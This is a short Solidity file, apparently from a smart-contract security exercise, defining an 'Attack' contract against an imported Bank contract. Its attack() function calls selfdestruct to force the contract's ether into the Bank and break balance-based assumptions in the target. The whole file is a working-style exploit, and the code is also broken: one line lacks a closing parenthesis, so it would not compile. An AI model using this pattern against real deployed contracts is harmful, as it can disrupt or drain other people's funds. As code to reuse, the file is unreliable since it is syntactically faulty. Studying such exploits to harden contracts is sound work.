import "./Bank.sol";

contract Attack {
    Bank public banking;

    constructor(address _bankingAddress) {
        banking = Bank(_bankingAddress);
    }

    fallback() external payable{}

    function attack() external {
        address payable bankingAddress = payable(address(banking);
        selfdestruct(bankingAddress);
    }

}
